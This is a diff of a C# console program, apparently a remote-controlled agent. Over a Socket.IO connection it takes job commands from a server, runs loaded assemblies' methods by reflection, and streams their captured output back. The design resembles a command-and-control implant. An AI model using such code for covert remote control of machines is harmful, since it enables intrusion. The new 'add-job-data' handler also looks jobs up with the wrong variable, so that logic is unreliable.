@@ -1,22 +1,17 @@
 using System;
 using System.Collections.Generic;
 using System.Linq;
-using System.Text;
 using System.Threading.Tasks;
 using SocketIOClient;
 using System.Net;
 using System.Security.Principal;
-using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Diagnostics;
 using System.IO;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Threading;
-using Microsoft.Win32;
-using System.Management;
-// TODO: Remove uneccesary imports
-
+using System.Text.Json;
 
 namespace ConsoleApp1
 {
@@ -27,6 +22,7 @@ namespace ConsoleApp1
         public string Method;
         public int Id;
         public Thread Thread;
+        public Queue<JsonElement> Queue;
     }
     public class Program
     {
@@ -104,7 +100,8 @@ namespace ConsoleApp1
 
             client.On("run-stream", response =>
             {
-                Thread myNewThread = new Thread(() => RunStream(client, response));
+                var queue = new Queue<JsonElement>();
+                Thread myNewThread = new Thread(() => RunStream(client, response, queue));
                 myNewThread.Start();
 
                 jobs.Add(new Job
@@ -113,7 +110,8 @@ namespace ConsoleApp1
                     Module = response.GetValue<string[]>()[0],
                     Method = "Stream",
                     Id = jobId++,
-                    Thread = myNewThread
+                    Thread = myNewThread,
+                    Queue = queue
                 });
             });
 
@@ -128,6 +126,12 @@ namespace ConsoleApp1
                         String.Join("\n", jobs.Select(j => $"{j.Id}\t{j.Module}\t{j.Method}\t{((int)(DateTime.Now - j.StartTime).TotalSeconds).ToString()}s"))
                         : "No active jobs"
                 });
+            });
+
+            client.On("add-job-data", response =>
+            {
+                var job_id = response.GetValue(0).GetProperty("id").GetInt32();
+                jobs.First(j => j.Id == jobId).Queue.Enqueue(response.GetValue(0));
             });
 
             client.On("kill-job", response =>
@@ -192,7 +196,7 @@ namespace ConsoleApp1
             client.EmitAsync("echo", new { returnType, output });
         }
 
-        static void RunStream(SocketIO client, SocketIOResponse response)
+        static void RunStream(SocketIO client, SocketIOResponse response, Queue<JsonElement> queue)
         {
             // Wrapper to run "Invoke" in a thread and send data to server
             string[] args = response.GetValue<string[]>();
@@ -203,7 +207,7 @@ namespace ConsoleApp1
             // do the thing
             try
             {
-                Invoke(assemblyName, assemblyArgs, "Stream", content => client.EmitAsync("echo", content));
+                Invoke(assemblyName, assemblyArgs, "Stream", content => client.EmitAsync("echo", content), queue);
             }
             catch (ThreadAbortException e)
             {
@@ -217,55 +221,47 @@ namespace ConsoleApp1
             client.EmitAsync("echo", new { returnType = 0, output });
         }
 
-        static (int, string) Invoke(string assemblyName, string[] args, string methodName = "Main", Func<object, Task> callback = null)
+        static (int, string) Invoke(string assemblyName, string[] args, string methodName = "Main", Func<object, Task> callback = null, Queue<JsonElement> queue = null)
         {
-            Assembly GetAssemblyByName(string name)
+            Assembly assembly = AppDomain.CurrentDomain.GetAssemblies().FirstOrDefault(a => a.GetName().Name == assemblyName);
+
+            if(assembly == null)
             {
-                try
-                {
-                    return AppDomain.CurrentDomain.GetAssemblies().First(_ => _.GetName().Name == name);
-                }
-                catch
-                {
-                    throw new Exception("Assembly " + name + " is not loaded into the process");
-                }
+                throw new Exception("Assembly " + assemblyName + " is not loaded into the process");
             }
 
-            Assembly assembly = GetAssemblyByName(assemblyName);
             Console.WriteLine("Debug: " + assembly.FullName);
             Type[] types = assembly.GetExportedTypes();
             object methodOutput;
             foreach (Type type in types)
             {
-                foreach (MethodInfo method in type.GetMethods())
+                var method = type.GetMethods().FirstOrDefault(m => m.Name == methodName);
+                if (method != null)
                 {
-                    if (method.Name == methodName)
+                    //Redirect output from C# assembly (such as Console.WriteLine()) to a variable instead of screen
+                    TextWriter prevConOut = Console.Out;
+                    var sw = new StringWriter();
+                    Console.SetOut(sw);
+
+                    object instance = Activator.CreateInstance(type);
+                    var input = (new object[] { args, callback, queue }).Where(p => p != null).ToArray();
+                    methodOutput = method.Invoke(instance, input);
+
+                    //Restore output -- Stops redirecting output
+                    Console.SetOut(prevConOut);
+                    string strOutput = sw.ToString();
+
+                    // Try catch this just in case the assembly we invoke doesn't have an (int) return value
+                    // otherwise the program would explode
+                    try
                     {
-                        //Redirect output from C# assembly (such as Console.WriteLine()) to a variable instead of screen
-                        TextWriter prevConOut = Console.Out;
-                        var sw = new StringWriter();
-                        Console.SetOut(sw);
-
-                        object instance = Activator.CreateInstance(type);
-                        methodOutput = method.Invoke(instance,
-                            callback is null ? new object[] { args } : new object[] { callback });
-
-                        //Restore output -- Stops redirecting output
-                        Console.SetOut(prevConOut);
-                        string strOutput = sw.ToString();
-
-                        // Try catch this just in case the assembly we invoke doesn't have an (int) return value
-                        // otherwise the program would explode
-                        try
-                        {
-                            methodOutput = (int)methodOutput;
-                        }
-                        catch
-                        {
-                            methodOutput = 0;
-                        };
-                        return ((int)methodOutput, strOutput);
+                        methodOutput = (int)methodOutput;
                     }
+                    catch
+                    {
+                        methodOutput = 0;
+                    };
+                    return ((int)methodOutput, strOutput);
                 }
             }
             return (0, null); // No methodOutput or string output
